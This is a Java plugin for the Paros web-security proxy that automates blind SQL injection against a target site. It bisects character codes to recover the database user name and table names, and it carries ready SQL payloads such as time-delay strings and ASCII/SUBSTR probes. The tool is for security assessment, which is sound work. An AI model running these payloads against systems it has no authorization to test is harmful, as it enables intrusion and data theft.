/*
 *
 * Paros and its related class files.
 * 
 * Paros is an HTTP/HTTPS proxy for assessing web application security.
 * Copyright (C) 2003-2004 Chinotec Technologies Company
 * 
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the Clarified Artistic License
 * as published by the Free Software Foundation.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * Clarified Artistic License for more details.
 * 
 * You should have received a copy of the Clarified Artistic License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */
package org.parosproxy.paros.core.scanner.plugin;

import java.io.IOException;
import java.util.regex.Pattern;

import org.apache.commons.httpclient.HttpException;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.parosproxy.paros.network.HttpStatusCode;


/**
 *
 * To change the template for this generated type comment go to
 * Window - Preferences - Java - Code Generation - Code and Comments
 */
public class TestInjectionOracleSQLEnumeration extends AbstractAppParamPlugin {

    private static final String[] dependency = {"TestInjectionSQLFingerprint", "TestInjectionSQL"};
    
    private static final int TIME_SPREAD = 15000;

	
//	private static final String SQL_DELAY_1 = "';waitfor%20delay%20'0:0:15';--";
//	private static final String SQL_DELAY_2 = ";waitfor%20delay%20'0:0:15';--";
//
//	private static final String SQL_BLIND_MS_INSERT = ");waitfor%20delay%20'0:0:15';--";
    private static final String SQL_DELAY_1 = "';waitfor delay '0:0:15';--";
    private static final String SQL_DELAY_2 = ";waitfor delay '0:0:15';--";

    private static final String SQL_BLIND_MS_INSERT = ");waitfor delay '0:0:15';--";

    private static final String SQL_BLIND_INSERT = ");--";
	
	
	private static final String SQL_CHECK_ERR = "'INJECTED_PARAM";		// invalid statement to trigger SQL exception. Make sure the pattern below does not appear here
	
	private static final Pattern patternErrorODBC1 = Pattern.compile("Microsoft OLE DB Provider for ODBC Drivers.*error", PATTERN_PARAM);
	private static final Pattern patternErrorODBC2 = Pattern.compile("ODBC.*Drivers.*error", PATTERN_PARAM);
	private static final Pattern patternErrorGeneric = Pattern.compile("JDBC|ODBC|SQL", PATTERN_PARAM);
	private static final Pattern patternErrorODBCMSSQL = Pattern.compile("ODBC SQL Server Driver", PATTERN_PARAM);
	
	private String mResBodyNormal 	= "";		// normal response for comparison
	private String mResBodyError	= "";	// error response for comparison



    /* (non-Javadoc)
     * @see com.proofsecure.paros.core.scanner.Test#getId()
     */
    public int getId() {
        return 40032;
    }

    /* (non-Javadoc)
     * @see com.proofsecure.paros.core.scanner.Test#getName()
     */
    public String getName() {
        return "Oracle SQL Injection Enumeration";
    }

    /* (non-Javadoc)
     * @see com.proofsecure.paros.core.scanner.Test#getDependency()
     */
    public String[] getDependency() {
        
        return dependency;
    }

    /* (non-Javadoc)
     * @see com.proofsecure.paros.core.scanner.Test#getDescription()
     */
    public String getDescription() {
        String msg = "The DB user name can be obtained.";
        return msg;
    }

    /* (non-Javadoc)
     * @see com.proofsecure.paros.core.scanner.Test#getCategory()
     */
    public int getCategory() {
        return Category.INJECTION;
    }

    /* (non-Javadoc)
     * @see com.proofsecure.paros.core.scanner.Test#getSolution()
     */
    public String getSolution() {
        String msg = "Refer SQL injection.";
        return msg;
    }

    /* (non-Javadoc)
     * @see com.proofsecure.paros.core.scanner.Test#getReference()
     */
    public String getReference() {
        String msg = "Refer SQL injection.";
        return msg;
            
    }

    /* (non-Javadoc)
     * @see com.proofsecure.paros.core.scanner.AbstractTest#init()
     */
    public void init() {


    }

    public void scan(HttpMessage baseMsg, String param, String value) {
		if (!getKb().getBoolean(baseMsg.getRequestHeader().getURI(), "sql/and")) {
		    return;
		}

		if (getKb().getString("sql/oracle/username") != null && getKb().getString("sql/oracle/tablename") != null) {
		    return;
		}
		
        try {
            scanSQL(baseMsg, param, value);
        } catch (Exception e) {
            
        }
    }

    /* (non-Javadoc)
     * @see com.proofsecure.paros.core.scanner.AbstractAppParamTest#scan(com.proofsecure.paros.network.HttpMessage, java.lang.String, java.lang.String)
     */
    public void scanSQL(HttpMessage baseMsg, String param, String value) throws HttpException, IOException {

        //protected void check(boolean isBody, String paramKey, String paramValue, String query, int insertPos) throws IOException {

		String bingoQuery = null;
		String displayURI = null;
		String newQuery = null;
		
		String resBodyAND = null;
		
		int pos = 0;
		long defaultTimeUsed = 0;

		HttpMessage msg = getNewMsg();
		
		// always try normal query first
		sendAndReceive(msg);
		defaultTimeUsed = msg.getTimeElapsedMillis();
		if (msg.getResponseHeader().getStatusCode() != HttpStatusCode.OK) {
			return;
		}

		mResBodyNormal = msg.getResponseBody().toString();
		
		if (getKb().getBoolean(msg.getRequestHeader().getURI(), "sql/and")) {
            if (getKb().getString("sql/oracle/username") == null) {
                checkDBUserName(msg, param, value);
            }
            
            if (getKb().getString("sql/oracle/tablename") == null) {
                checkDBTableName(msg, param, value);
            }

		}
    }
	

	private boolean checkResult(HttpMessage msg, String query) {

		long defaultTimeUsed = 0;
		long timeUsed = 0;
		long lastTime = 0;

		int TRY_COUNT = 10;
		StringBuffer sb = new StringBuffer();

		if (msg.getResponseHeader().getStatusCode() != HttpStatusCode.OK
			&& !HttpStatusCode.isServerError(msg.getResponseHeader().getStatusCode())) {
			return false;
		}

		if (matchBodyPattern(msg, patternErrorODBCMSSQL, sb)) {
		    getKb().add(msg.getRequestHeader().getURI(), "sql/mssql", new Boolean(true));
		}
		
		if (matchBodyPattern(msg, patternErrorODBC1, sb)
				|| matchBodyPattern(msg, patternErrorODBC2, sb)) {
			// check for ODBC error.  Almost certain.
			return true;
		} else if (matchBodyPattern(msg, patternErrorGeneric, sb)) {
			// check for other sql error (JDBC) etc.  Suspicious.
			return true;
		}
		
		return false;
		
	}
		
	private void checkDBUserName(HttpMessage msg, String param, String value) throws HttpException, IOException {

        
        
	    int charValue = 0;
	    StringBuffer sb = new StringBuffer();
	    byte[] byteArray = new byte[1];
	    
	    for (int i=0; i<20; i++) {
	        int bit = 0;
	        charValue = 0;

	        charValue = getDBUserNameBisection(msg, param, value, i, 47, 123);
	        if (charValue == 47 || charValue == 123) {
	            break;
	        }

	        // linear search - use only when failed
//	        for (int j=48; j<123; j++) {
//	            boolean result = getDBNameQuery(msg, param, value, i, j);
//	            if (result) {
//	                charValue = j;
//	                break;
//	            }
//	        }

            byteArray[0] = (byte) charValue;
            String s = new String(byteArray, "UTF8");
            sb.append(s);
	    }
	    String result = sb.toString();
	    if (result.length() > 0) {
	        getKb().add("sql/oracle/username", result);
			bingo(Alert.RISK_HIGH, Alert.SUSPICIOUS, null, "", "current db user name: " + result, msg);

	    }
	}
	
	private int getDBUserNameBisection(HttpMessage msg, String param, String value, int charPos, int rangeLow, int rangeHigh) throws HttpException, IOException {
	    if (rangeLow == rangeHigh) {
	        return rangeLow; 
	    }
	    
	    int medium = (rangeLow + rangeHigh) / 2;
	    boolean result = getDBUserNameQuery(msg, param, value, charPos, medium);

	    if (rangeHigh - rangeLow < 2) {
	        if (result) {
	            return rangeHigh;
	        } else {
	            return rangeLow;
	        }
	    }
	    
	    if (result) {
	        rangeLow = medium;
	    } else {
	        rangeHigh = medium;
	    }
	    
	    int charResult = getDBUserNameBisection(msg, param, value, charPos, rangeLow, rangeHigh);
	    return charResult;
	}

	private boolean getDBUserNameQuery(HttpMessage msg, String param, String value, int charPos, int charCode) throws HttpException, IOException {
	    
	    //linear search - inefficient
	    //String s1 = "' AND ASCII(SUBSTR(USER_NAME()," + (charPos +1) + ",1)) = " + charCode + " AND '1'='1";
		String s1 = "' AND ASCII(SUBSTR(USER," + (charPos +1) + ",1))>" + charCode + " AND '1'='1";
		
		String resBodyAND = "";
		boolean is1 = false;
		
		//setParameter(msg, param, value + getURLEncode(s1));
        setParameter(msg, param, value + s1);

		sendAndReceive(msg);
		
		if (msg.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
			// try if 1st SQL AND looks like normal query
			resBodyAND = stripOff(msg.getResponseBody().toString(), getURLEncode(s1));
			if (resBodyAND.compareTo(mResBodyNormal) == 0) {
			    is1 = true;
			}
		}

		return is1;

	}

	private void checkDBTableName(HttpMessage msg, String param, String value) throws HttpException, IOException {
	    
	    int charValue = 0;
	    StringBuffer sb = null;
	    byte[] byteArray = new byte[1];

	    for (int row=1; row<4; row++) {
	        sb = new StringBuffer();
		    
	        for (int i=0; i<10; i++) {
	            charValue = 0;
	            
	            charValue = getTableNameBisection(msg, param, value, i, 47, 123, row);
	            if (charValue == 47 || charValue == 123) {
	                break;
	            }
	            
	            
	            byteArray[0] = (byte) charValue;
	            String s = new String(byteArray, "UTF8");
	            sb.append(s);
	        }
	        String result = sb.toString();
	        if (result.length() > 0) {
	            getKb().add("sql/oracle/tablename", result);
	            bingo(Alert.RISK_HIGH, Alert.SUSPICIOUS, null, "", "table name: " + result, msg);
	            
	        }
	    }
	}

	
	private int getTableNameBisection(HttpMessage msg, String param, String value, int charPos, int rangeLow, int rangeHigh, int row) throws HttpException, IOException {
	    if (rangeLow == rangeHigh) {
	        return rangeLow; 
	    }
	    
	    int medium = (rangeLow + rangeHigh) / 2;
	    boolean result = getTableNameQuery(msg, param, value, charPos, medium, row);

	    if (rangeHigh - rangeLow < 2) {
	        if (result) {
	            return rangeHigh;
	        } else {
	            return rangeLow;
	        }
	    }
	    
	    if (result) {
	        rangeLow = medium;
	    } else {
	        rangeHigh = medium;
	    }
	    
	    int charResult = getTableNameBisection(msg, param, value, charPos, rangeLow, rangeHigh, row);
	    return charResult;
	}

	
	private boolean getTableNameQuery(HttpMessage msg, String param, String value, int charPos, int charCode, int row) throws HttpException, IOException {
	    
	    //linear search - inefficient
		String s1 = null;
		
		if (row == 1) {
		    s1= "' AND ascii(substr((SELECT TOP 1 object_name FROM user_objects WHERE object_type='TABLE' ORDER BY object_name),"+(charPos+1)+", 1))>" + charCode + " AND '1'='1";
		} else {
		    s1 = "' AND ascii(substr((SELECT TOP 1 a.object_name FROM user_objects as a WHERE a.object_type='TABLE' AND a.object_name NOT IN(SELECT TOP " + (row -1)+ " b.object_name FROM user_objects AS b WHERE b.object_type='TABLE' order by b.object_name)),"+(charPos+1)+", 1))>" + charCode + " AND '1'='1";
		}
		
		String resBodyAND = "";
		boolean is1 = false;
		
		// try 2nd blind SQL query using AND with quote
		setParameter(msg, param, value + s1);
		sendAndReceive(msg);
		
		if (msg.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
			// try if 1st SQL AND looks like normal query
			resBodyAND = stripOff(msg.getResponseBody().toString(), getURLEncode(s1));
			if (resBodyAND.compareTo(mResBodyNormal) == 0) {
			    is1 = true;
			}
		}

		return is1;

	}
    
    public boolean isVisible() {
        return Constant.isSP();
    }


}
